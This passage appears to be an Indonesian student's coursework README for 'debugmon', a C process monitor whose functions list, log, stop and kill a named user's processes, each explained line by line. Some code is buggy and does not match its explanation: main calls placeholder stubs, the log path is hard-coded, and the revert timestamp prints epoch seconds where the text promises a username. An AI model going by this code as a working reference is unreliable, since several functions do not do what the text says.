        int pid = atoi(entry->d_name);

        snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);

        status_file = fopen(status_path, "r");
        if (!status_file) continue;

        int uid;
        while (fgets(line, sizeof(line), status_file)) {
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line, "Uid: %d", &uid);
                break;
            }
        }
        fclose(status_file);

        char *user_from_uid = getpwuid(uid)->pw_name;
        if (strcmp(user_from_uid, username) != 0)
            continue;

        stat_file = fopen(stat_path, "r");
        if (!stat_file) continue;

        unsigned long utime, stime, rss;
        fscanf(stat_file, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu %*d %*d %*d %*d %*d %*d %*d %*d %lu", 
                &utime, &stime, &rss);
        fclose(stat_file);

        unsigned long total_time = utime + stime;

        cmdline_file = fopen(cmdline_path, "r");
        if (!cmdline_file) continue;

        char cmdline[256];
        fgets(cmdline, sizeof(cmdline), cmdline_file);
        fclose(cmdline_file);

        if (strlen(cmdline) == 0)
            snprintf(cmdline, sizeof(cmdline), "[%d]", pid);

        printf("%-10d %-10s %-10lu %-10lu\n", pid, cmdline, total_time, rss);
    }

    closedir(proc_dir);
}
```
### Output
![image](https://github.com/user-attachments/assets/7e837613-c9d7-48d9-a0c1-6dfbba537a40)

### > Penjelasan
#### 1. Deklarasi Variabel dan Direktori
```
void list_user_processes(const char *username) {
    DIR *proc_dir;
    struct dirent *entry;

``` 
```DIR *proc_dir``` mengarah ke direktori ```/proc``` dan dia akan membaca informasi proses yang sedang berjalan.

```struct dirent *entry``` untuk membaca entri file atau direktori dalam ```/proc```.

#### 2. Membuka Direktori ```/proc```
```
proc_dir = opendir("/proc");
if (!proc_dir) {
    perror("Failed to open /proc directory");
    exit(EXIT_FAILURE);
}
```
```opendir``` untuk membuka direktori ```/proc``` dan membaca entri proses.

```perror dan exit``` untuk menangani error jika direktori ```/proc``` tidak dapat diakses.

#### 3. Header Tabel
```
printf("%-10s %-10s %-10s %-10s\n", "PID", "COMMAND", "CPU%", "MEM%");
```
Untuk menampilkan header tabel untuk kolom: PID, COMMAND, CPU%, dan MEM%.

#### 4. Iterasi Direktori ```/proc```
```
while ((entry = readdir(proc_dir)) != NULL) {
    if (!isdigit(entry->d_name[0]))
        continue;
```

```readdir``` untuk membaca setiap entri dalam direktori ```/proc```.

```isdigit(entry->d_name[0])``` untuk memeriksa apakah nama entri dimulai dengan angka, karena hanya entri dengan angka yang mewakili proses.

#### 5. Path untuk File Proses
```
char stat_path[256], cmdline_path[256], status_path[256];
snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
```

```snprintf``` untuk membuat path absolut untuk file yang berisi informasi proses:

```/proc/[PID]/stat``` berisi statistik proses.

```/proc/[PID]/cmdline``` berisi command line yang digunakan untuk memulai proses.

```/proc/[PID]/status``` berisi metadata proses, termasuk UID.


#### 6. Membaca UID dari file status
```
status_file = fopen(status_path, "r");
if (!status_file) continue;
while (fgets(line, sizeof(line), status_file)) {
    if (strncmp(line, "Uid:", 4) == 0) {
        sscanf(line, "Uid: %d", &uid);
        break;
    }
}
fclose(status_file);
```

akan membuka file ```/proc/[PID]/status``` untuk membaca UID proses dan mencocokkannya dengan username target.

#### 7. Membaca statistik proses

```
stat_file = fopen(stat_path, "r");
if (!stat_file) continue;
unsigned long utime, stime, rss;
fscanf(stat_file, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu %*d %*d %*d %*d %*d %*d %*d %*d %lu", 
        &utime, &stime, &rss);
fclose(stat_file);
```
akan membaca file ```/proc/[PID]/stat``` untuk mendapatkan waktu CPU (utime dan stime) serta penggunaan memori (rss) dari proses.


#### 8. Membaca nama command
```
cmdline_file = fopen(cmdline_path, "r");
if (!cmdline_file) continue;
char cmdline[256];
fgets(cmdline, sizeof(cmdline), cmdline_file);
fclose(cmdline_file);

if (strlen(cmdline) == 0)
    snprintf(cmdline, sizeof(cmdline), "[%d]", pid);
```

Membaca file ```/proc/[PID]/cmdline``` untuk mendapatkan command line yang digunakan untuk menjalankan proses. Jika kosong, menggantinya dengan [PID].

#### 9. Menampilkan informasi proses
```
printf("%-10d %-10s %-10lu %-10lu\n", pid, cmdline, total_time, rss);
```
Menampilkan PID, nama command, waktu CPU, dan memori proses dalam format tabel.

#### 10. Menutup direktori
```
closedir(proc_dir);
```
Menutup direktori ```/proc``` setelah selesai membaca semua proses.


### B. Memasang mata-mata dalam mode daemon
```
FILE *log_file = NULL;

void log_process(const char* process_name, const char* status, const char* username) {
    if (!log_file) {
        char log_path[256];
        snprintf(log_path, sizeof(log_path), "/home/dinda/debugmon.log", username);
        
        log_file = fopen(log_path, "a");
        if (!log_file) {
            perror("Failed to open debugmon.log");
            return;
        }
    }

    time_t now = time(NULL);
    struct tm* t = localtime(&now);

    fprintf(log_file, "[%02d/%02d/%04d %02d:%02d:%02d] %s : %s\n",
        t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
        t->tm_hour, t->tm_min, t->tm_sec,
        process_name, status);

    fflush(log_file);
}

void cleanup_log() {
    if (log_file) {
        fclose(log_file);
        log_file = NULL;
    }
}

void signal_handler(int sig) {
    cleanup_log();
    exit(0);
}

void daemon_mode(const char* user) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("First fork failed");
        exit(1);
    }
    if (pid > 0) exit(0);

    if (setsid() < 0) {
        perror("setsid failed");
        exit(1);
    }

    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, signal_handler);

    pid = fork();
    if (pid < 0) {
        perror("Second fork failed");
        exit(1);
    }
    if (pid > 0) exit(0);

    umask(0);
    chdir("/");

    // Alihkan file descriptor ke /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > 2) close(fd);
    }

    while (1) {
        struct dirent* entry;
        DIR* dir = opendir("/proc");
        if (!dir) {
            log_process("debugmon", "ERROR: Failed to open /proc", user);
            cleanup_log();
            sleep(10);
            continue;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (isdigit(entry->d_name[0])) {
                char path[256], cmdline[256];
                snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

                FILE* fp = fopen(path, "r");
                if (fp) {
                    if (fgets(cmdline, sizeof(cmdline), fp)) {
                        cmdline[strcspn(cmdline, "\n")] = '\0';
                        log_process(cmdline, "RUNNING", user);
                    }
                    fclose(fp);
                }
            }
        }

        closedir(dir);
        sleep(10);
    }
}
```
> Output
> ![WhatsApp Image 2025-04-18 at 17 18 19_fcb8acdf](https://github.com/user-attachments/assets/61a6448a-467a-40cf-bab3-788f0d6efd5c)

### > Penjelasan

#### 1. Logging aktivitas proses
```
void log_process(const char* process_name, const char* status, const char* username) {
    if (!log_file) {
        char log_path[256];
        snprintf(log_path, sizeof(log_path), "/home/dinda/debugmon.log", username);
        log_file = fopen(log_path, "a");
        if (!log_file) {
            perror("Failed to open debugmon.log");
            return;
        }
    }

    time_t now = time(NULL);
    struct tm* t = localtime(&now);

    fprintf(log_file, "[%02d/%02d/%04d %02d:%02d:%02d] %s : %s\n",
        t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
        t->tm_hour, t->tm_min, t->tm_sec,
        process_name, status);

    fflush(log_file);
}
```
- Akan membuka file log ```(/home/dinda/debugmon.log)``` untuk mencatat aktivitas proses.

- Akan menulis informasi log berupa waktu, nama proses, dan statusnya (misalnya "RUNNING").

- File log dibuka dalam mode append agar data sebelumnya tidak terhapus.

#### 2. Membersihkan file log saat keluar
```
void cleanup_log() {
    if (log_file) {
        fclose(log_file);
        log_file = NULL;
    }
}
```
Akan menutup file log jika sudah selesai digunakan, memastikan tidak ada kebocoran resource.

#### 3. Menangani sinyal untuk keluar dengan bersih
```
void signal_handler(int sig) {
    cleanup_log();
    exit(0);
}
```
Ketika proses menerima sinyal seperti SIGTERM, file log ditutup dengan bersih sebelum program keluar.

#### 4. Mode daemon
```
void daemon_mode(const char* user) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("First fork failed");
        exit(1);
    }
    if (pid > 0) exit(0);

    if (setsid() < 0) {
        perror("setsid failed");
        exit(1);
    }

    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, signal_handler);

    pid = fork();
    if (pid < 0) {
        perror("Second fork failed");
        exit(1);
    }
    if (pid > 0) exit(0);

    umask(0);
    chdir("/");
}
```
Fungsi ini membuat proses menjadi daemon

- Fork pertama: Mengakhiri proses induk agar daemon berjalan di background.

- Fork kedua: Menghindari daemon menjadi pemimpin sesi.

Lalu, akan memutuskan hubungan dengan terminal dan mengatur direktori kerja ke root ```(chdir("/"))```.

#### 5. Pengalihan file descriptor
```
int fd = open("/dev/null", O_RDWR);
if (fd != -1) {
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if (fd > 2) close(fd);
}
```

Mengalihkan input, output, dan error ```ke /dev/null``` agar daemon tidak mengganggu terminal.

#### 6. Pemantauan proses di ```/proc```
```
while (1) {
    struct dirent* entry;
    DIR* dir = opendir("/proc");
    if (!dir) {
        log_process("debugmon", "ERROR: Failed to open /proc", user);
        cleanup_log();
        sleep(10);
        continue;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (isdigit(entry->d_name[0])) {
            char path[256], cmdline[256];
            snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

            FILE* fp = fopen(path, "r");
            if (fp) {
                if (fgets(cmdline, sizeof(cmdline), fp)) {
                    cmdline[strcspn(cmdline, "\n")] = '\0';
                    log_process(cmdline, "RUNNING", user);
                }
                fclose(fp);
            }
        }
    }

    closedir(dir);
    sleep(10);
}
```
Akan membuka direktori ```/proc``` untuk membaca semua proses yang sedang berjalan.

Untuk setiap proses:

- Membaca nama proses dari file ```/proc/[PID]/comm```.

- Menuliskan aktivitas proses (misalnya, status "RUNNING") ke file log.

Lalu proses ini dilakukan terus-menerus setiap 10 detik.

### C. Menghentikan pengawasan
```
void stop(const char* username){
    FILE *pid_file;
    pid_t pid;
    char pid_filename[64];
    snprintf(pid_filename, sizeof(pid_filename), "debugmon_%s.pid", username);
    
    pid_file = fopen(pid_filename, "r");

    if(!pid_file){
        fprintf(stderr, "Can't find PID file! Make sure daemon running");
        return;
    }

    if(fscanf(pid_file, "%d", &pid) != 1){
        fprintf(stderr, "Fail to read PID! \n");
        fclose(pid_file);
        return;
    }

    fclose(pid_file);
    if (kill(pid, SIGTERM) == 0) {
        printf("Succesfully stopped user %s (PID: %d) Debugmon\n", username, pid);
        remove(pid_filename); 
    } else {
        perror("Fail to stop process...");
    }
} 

uid_t get_uid(const char* username) {
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        fprintf(stderr, "User %s not found.\n", username);
        exit(EXIT_FAILURE);
    }
    return pwd->pw_uid;
}
```
### Penjelasan
#### 1. Fungsi stop
```
void stop(const char* username){
    FILE *pid_file;
    pid_t pid;
    char pid_filename[64];
    snprintf(pid_filename, sizeof(pid_filename), "debugmon_%s.pid", username);
```
- Untuk membentuk nama file PID `(debugmon_[username].pid)`
 - Untuk untuk menyimpan PID dari daemon milik pengguna tertentu.

```
    pid_file = fopen(pid_filename, "r");
    if(!pid_file){
        fprintf(stderr, "Can't find PID file! Make sure daemon running");
        return;
    }
```
- Membuka file PID untuk membaca PID daemon yang sedang berjalan.

- Jika file tidak ditemukan, maka kemungkinan daemon belum berjalan, dan pesan error akan ditampilkan.
```
    if(fscanf(pid_file, "%d", &pid) != 1){
        fprintf(stderr, "Fail to read PID! \n");
        fclose(pid_file);
        return;
    }
 ```

Untuk membaca PID dari file. Jika gagal membaca data, fungsi akan keluar dengan pesan error.

```
    fclose(pid_file);
    if (kill(pid, SIGTERM) == 0) {
        printf("Succesfully stopped user %s (PID: %d) Debugmon\n", username, pid);
        remove(pid_filename); 
    } else {
        perror("Fail to stop process...");
    }
```
- Akan mengirim sinyal SIGTERM ke PID yang diambil dari file, untuk menghentikan daemon.

- Jika penghentian berhasil, file PID akan dihapus. Jika gagal, pesan error akan ditampilkan.

#### 2. Fungsi get_uid
```
uid_t get_uid(const char* username) {
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        fprintf(stderr, "User %s not found.\n", username);
        exit(EXIT_FAILURE);
    }
    return pwd->pw_uid;
}
```
- Fungsi ini untuk mendapatkan UID (User ID) dari username yang diberikan.

- Memanfaatkan fungsi `getpwnam` untuk mencari informasi user berdasarkan nama.

- Jika user tidak ditemukan, program akan menampilkan error dan keluar.

- Mengembalikan UID user yang ditemukan.

### D. Menggagalkan semua proses user yang sedang berjalan
```
void fail(const char* username){
    DIR *proc;
    proc = opendir("/proc");
    struct dirent *entry;
    uid_t target_uid = get_uid(username);

    char logpath[256];
    snprintf(logpath, sizeof(logpath), "logs/%s.log", username);
    FILE *logfile = fopen(logpath, "a");

    if (!logfile) {
        perror("Fail to open logfile");
        closedir(proc);
        return;
    }

    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;

        char status_path[256];
        snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);

        FILE *status_file = fopen(status_path, "r");
        if (!status_file) continue;

        char line[256];
        uid_t uid = -1;
        char cmdline[256] = "unknown";

        while (fgets(line, sizeof(line), status_file)) {
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line, "Uid:\t%u", &uid);
            } else if (strncmp(line, "Name:", 5) == 0) {
                sscanf(line, "Name:\t%255s", cmdline);
            }
        }
        fclose(status_file);

        if (uid == target_uid) {
            pid_t pid = atoi(entry->d_name);
            if (kill(pid, SIGKILL) == 0) {
                fprintf(logfile, "[FAILED] PID %d (command: %s)\n", pid, cmdline);
                printf("Killed PID %d (%s)\n", pid, cmdline);
            } else {
                fprintf(logfile, "[ERROR] Failed killing PID %d (%s)\n", pid, cmdline);
            }
        }
    }

    fclose(logfile);
    closedir(proc);
}
```
### Penjelasan
Fungsi fail:
```
void fail(const char* username) {
    DIR *proc;
    proc = opendir("/proc");
    struct dirent *entry;
    uid_t target_uid = get_uid(username);
```
- akan membuka direktori `/proc` untuk membaca semua proses yang sedang berjalan di sistem.
- akan memanggil fungsi `get_uid` untuk mendapatkan UID dari username yang diberikan. UID ini akan digunakan untuk memfilter proses milik user tersebut.
```
    char logpath[256];
    snprintf(logpath, sizeof(logpath), "logs/%s.log", username);
    FILE *logfile = fopen(logpath, "a");
```
- untuk menentukan lokasi file log di direktori logs dengan nama `[username].log`.
- akan membuka file log untuk mencatat proses-proses yang dihentikan. Jika file gagal dibuka, program akan menampilkan pesan error dan keluar dari fungsi.

```
    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;
```
Membaca isi direktori `/proc`. Hanya subdirektori yang namanya berupa angka (PID) yang diperiksa, karena direktori lain tidak mewakili proses.

```
        char status_path[256];
        snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);
        FILE *status_file = fopen(status_path, "r");
        if (!status_file) continue;
```
akan membuka file `/proc/[PID]/status` untuk mendapatkan informasi tentang proses. Jika file tidak dapat dibuka, proses tersebut dilewati.
```
        char line[256];
        uid_t uid = -1;
        char cmdline[256] = "unknown";

        while (fgets(line, sizeof(line), status_file)) {
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line, "Uid:\t%u", &uid);
            } else if (strncmp(line, "Name:", 5) == 0) {
                sscanf(line, "Name:\t%255s", cmdline);
            }
        }
        fclose(status_file);
```
Akan membaca file status untuk mendapatkan UID dan nama proses:
- Baris yang dimulai dengan Uid: digunakan untuk mengambil UID proses.
- Baris yang dimulai dengan Name: digunakan untuk mengambil nama proses.
- UID dan nama proses disimpan dalam variabel uid dan cmdline.

```
        if (uid == target_uid) {
            pid_t pid = atoi(entry->d_name);
            if (kill(pid, SIGKILL) == 0) {
                fprintf(logfile, "[FAILED] PID %d (command: %s)\n", pid, cmdline);
                printf("Killed PID %d (%s)\n", pid, cmdline);
            } else {
                fprintf(logfile, "[ERROR] Failed killing PID %d (%s)\n", pid, cmdline);
            }
        }
    }
```
- Jika UID proses cocok dengan UID target, proses dihentikan menggunakan sinyal SIGKILL.

- Hasil dari upaya ini dicatat ke file log:

- Jika proses berhasil dihentikan, log [FAILED] ditulis.

- Jika gagal, log [ERROR] ditulis.

- Informasi yang dicatat meliputi PID dan nama proses `(cmdline)`.

```
    fclose(logfile);
    closedir(proc);
}
```
akan menutup file log dan direktori /proc setelah semua proses selesai diproses.



### E. Mengizinkan user untuk kembali menjalankan proses
```
void revert(const char *username) {
    printf("Mode normal dipulihkan untuk user %s. Proses baru dapat dijalankan kembali.\n", username);
    
    char log_entry[256];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(log_entry, sizeof(log_entry), "[%d:%m:%Y]-[%H:%M:%S]_%s_REVERT\n", t);
    FILE *logFile = fopen("debugmon.log", "a");
    if (logFile != NULL) {
        fprintf(logFile, "%s", log_entry);
        fclose(logFile);
    }
}
```
### Penjelasan
```
printf("Mode normal dipulihkan untuk user %s. Proses baru dapat dijalankan kembali.\n", username);
```
Memberitahu pengguna bahwa mode normal untuk username telah dipulihkan, dan proses baru dapat dijalankan kembali.
```
char log_entry[256];
time_t now = time(NULL);
struct tm *t = localtime(&now);
strftime(log_entry, sizeof(log_entry), "[%d:%m:%Y]-[%H:%M:%S]_%s_REVERT\n", t);
```
Membuat string log yang mencatat waktu saat mode dipulihkan. Format waktu diambil dari sistem saat ini, kemudian diubah menjadi format `[dd:mm:yyyy]-[hh:mm:ss]_username_REVERT`.

```
FILE *logFile = fopen("debugmon.log", "a");
if (logFile != NULL) {
    fprintf(logFile, "%s", log_entry);
    fclose(logFile);
}
```
- Membuka file log `debugmon.log` dalam mode append untuk menambahkan entri log.
- Jika file berhasil dibuka, menulis entri log ke file dan menutupnya.
- Jika gagal membuka file, aksi log diabaikan tanpa memengaruhi proses utama.

### F. Mencatat ke dalam file log
```
void writeLog(const char *processName, const char *status) {
    FILE *logFile = fopen("debugmon.log", "a");
    if (logFile == NULL) {
        perror("Gagal membuka file log");
        return;
    }

    char timestamp[100];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", t);

    fprintf(logFile, "%s_%s_%s\n", timestamp, processName, status);
    fclose(logFile);
}

void list_processes(const char* username) {
    printf("Listing processes for user: %s\n", username);
}

void run_daemon(const char* username) {
    printf("Running daemon for user: %s\n", username);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <list|daemon> <user>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *command = argv[1];
    const char *username = argv[2];

    if (strcmp(command, "list") == 0) {
        list_processes(username);
    } else if (strcmp(command, "daemon") == 0) {
        run_daemon(username);
    } else if (strcmp(command, "stop") == 0) {
        stop(username);
    } 
    else if (strcmp(command, "fail") == 0) {
        fail(username);
    } 
    else if (strcmp(command, "revert") == 0) {
        revert(username);
    }
    else {
        fprintf(stderr, "Invalid command. Use 'list' or 'daemon'.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```
### Penjelasan
#### Fungsi `writeLog`

Fungsi ini digunakan untuk mencatat log aktivitas proses ke file log `debugmon.log`.

```
FILE *logFile = fopen("debugmon.log", "a");
if (logFile == NULL) {
    perror("Gagal membuka file log");
    return;
}
```
- Membuka file `debugmon.log` dalam mode append `(a)` untuk menambahkan entri log baru.
- Jika gagal membuka file, fungsi menampilkan pesan kesalahan dan langsung keluar.

```
char timestamp[100];
time_t now = time(NULL);
struct tm *t = localtime(&now);
strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", t);
```
untuk membuat timestamp dalam format `[dd:mm:yyyy]-[hh:mm:ss]` menggunakan waktu saat ini.

```
fprintf(logFile, "%s_%s_%s\n", timestamp, processName, status);
fclose(logFile);
```
- Menulis log ke file dalam format:
`[timestamp]_[processName]_[status], misalnya:
[18:04:2025]-[12:34:56]_myProcess_RUNNING`.
- akan Menutup file setelah selesai menulis.

```
if (argc < 3) {
    fprintf(stderr, "Usage: %s <list|daemon|stop|fail|revert> <user>\n", argv[0]);
    return EXIT_FAILURE;
}
```
- Mengecek jumlah argumen yang diberikan. Jika kurang dari 3, program mencetak format penggunaan yang benar dan keluar dengan kode gagal `(EXIT_FAILURE)`.

Argumen pertama `(argv[0])` adalah nama program, argumen kedua `(argv[1])` adalah perintah, dan argumen ketiga `(argv[2])`` adalah nama user.
```
const char *command = argv[1];
const char *username = argv[2];
``` 
Variabel command menyimpan perintah yang diberikan user.

Variabel username menyimpan nama user yang akan diproses.

Cabang Perintah
list
```
if (strcmp(command, "list") == 0) {
    list_processes(username);
}
```
Jika perintah adalah list, fungsi `list_processes` dipanggil untuk menampilkan daftar proses milik user tertentu.

#### daemon
```
else if (strcmp(command, "daemon") == 0) {
    run_daemon(username);
}
```
Jika perintah adalah daemon, fungsi `run_daemon` dipanggil untuk menjalankan daemon yang memantau aktivitas proses milik user tertentu.

#### stop
```
else if (strcmp(command, "stop") == 0) {
    stop(username);
}
```
Jika perintah adalah stop, fungsi stop dipanggil untuk menghentikan daemon yang berjalan untuk user tertentu.

#### fail
```
else if (strcmp(command, "fail") == 0) {
    fail(username);
}
```
Jika perintah adalah fail, fungsi fail dipanggil untuk mengakhiri semua proses milik user tertentu dan mencatatnya dalam log.

#### revert
```
else if (strcmp(command, "revert") == 0) {
    revert(username);
}
```
Jika perintah adalah revert, fungsi revert dipanggil untuk memulihkan mode normal bagi user, memungkinkan proses baru dijalankan kembali.

#### Kesalahan Perintah
```
else {
    fprintf(stderr, "Invalid command. Use 'list', 'daemon', 'stop', 'fail', or 'revert'.\n");
    return EXIT_FAILURE;
}
```
Jika perintah tidak sesuai dengan opsi yang valid (list, daemon, stop, fail, atau revert), program mencetak pesan kesalahan dan keluar dengan kode gagal.

#### Return Value
```
return EXIT_SUCCESS;
```
Jika program berhasil dijalankan tanpa error, program keluar dengan kode sukses `(EXIT_SUCCESS)`.
